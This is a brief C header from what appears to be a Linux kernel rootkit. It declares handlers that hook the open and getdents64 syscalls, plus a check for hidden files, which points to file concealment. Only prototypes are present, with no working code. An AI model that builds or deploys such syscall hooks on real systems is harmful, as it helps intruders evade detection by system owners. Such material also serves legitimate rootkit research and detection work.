#include "rootkit_cmd.h"
#include <linux/module.h>

void open_enter_handler(char *__user filename, struct rootkit_cmd *cmd);

bool is_hidden_file(const char *str);

void open_exit_handler(struct pt_regs *syscall_regs, struct rootkit_cmd cmd);

void getdents64_exit_handler(struct pt_regs *regs,
                             struct rootkit_cmd syscall_metadata);
